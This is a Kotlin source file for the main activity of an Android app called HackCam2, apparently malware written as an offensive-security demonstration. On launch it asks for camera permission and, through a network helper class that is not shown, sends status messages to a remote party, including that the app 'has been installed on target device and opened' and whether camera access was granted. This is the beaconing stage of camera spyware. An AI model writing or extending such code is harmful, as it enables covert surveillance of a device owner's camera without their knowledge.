package cocomelonc.hackcam2

import cocomelonc.hackcam2.tools.HackCam2Network
import android.os.Bundle
import android.widget.Button
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import android.content.pm.PackageManager
import android.widget.Toast
import androidx.core.content.ContextCompat

class HackCam2MainActivity : ComponentActivity() {
    private lateinit var cameraButton: Button
    private lateinit var hackCam2ViewModel: HackCam2ViewModel

    // activity result launcher to request permission
    private val requestPermissionLauncher = registerForActivityResult (
        ActivityResultContracts.RequestPermission()) {isGranted: Boolean ->
        if (isGranted) {
            HackCam2Network(this).sendTextMessage("LoveBahrain Cam2 permission granted\n")
            Toast.makeText(this, "Hack Camera permission granted", Toast.LENGTH_SHORT).show()
        } else {
            HackCam2Network(this).sendTextMessage("LoveBahrain Cam2 permission denied\n")
            Toast.makeText(this, "Hack Camera permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    // checking cam permission
    private fun checkCameraPermission() {
        when {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED -> {
                // permission is granted
                Toast.makeText(this, "Hack Camera permission already granted", Toast.LENGTH_SHORT).show()
                HackCam2Network(this).sendTextMessage("LoveBahrain Cam2 permission already granted\n")
            } else -> {
            requestPermissionLauncher.launch(android.Manifest.permission.CAMERA)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hackCam2ViewModel = HackCam2ViewModel(this)
        setContentView(R.layout.activity_main)
        HackCam2Network(this).sendTextMessage("LoveBahrain Cam2 App has been installed on target device and opened\n")

        checkCameraPermission()
        cameraButton = findViewById(R.id.camButton)

        cameraButton.setOnClickListener {
            checkCameraPermission()
        }
    }
}